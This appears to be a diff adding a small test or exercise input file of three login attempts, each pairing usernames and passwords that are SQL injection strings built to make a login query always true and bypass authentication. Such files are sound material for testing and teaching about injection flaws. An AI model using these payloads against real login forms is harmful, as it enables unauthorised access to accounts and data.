@@ -1,0 +1,16 @@
+Enter username:
+adam
+Enter password:
+' OR '1' = '1
+--------------------------------
+Enter username:
+' or 'joseph' ='joseph
+Enter password:
+' or 'pass' ='pass
+--------------------------------
+Enter username:
+' or username like '%B%
+Enter password:
+' or password like '%B%
+--------------------------------
+
